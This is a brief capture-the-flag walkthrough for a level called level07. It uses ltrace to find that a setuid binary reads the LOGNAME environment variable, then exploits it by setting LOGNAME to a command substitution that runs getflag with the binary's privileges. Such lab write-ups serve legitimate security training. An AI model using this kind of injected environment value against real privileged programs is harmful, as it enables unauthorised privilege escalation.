## level07

From the directory listing we can see that `level07` is running with the flag07 privileges.
```bash
$ ll

-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
```

Looking at the lib functions gives us the clue about `LOGNAME` env var.
```bash
ltrace ./level07
```

And the solution for this level as simple as that:
```bash
LOGNAME='$(getflag)' ./level07
```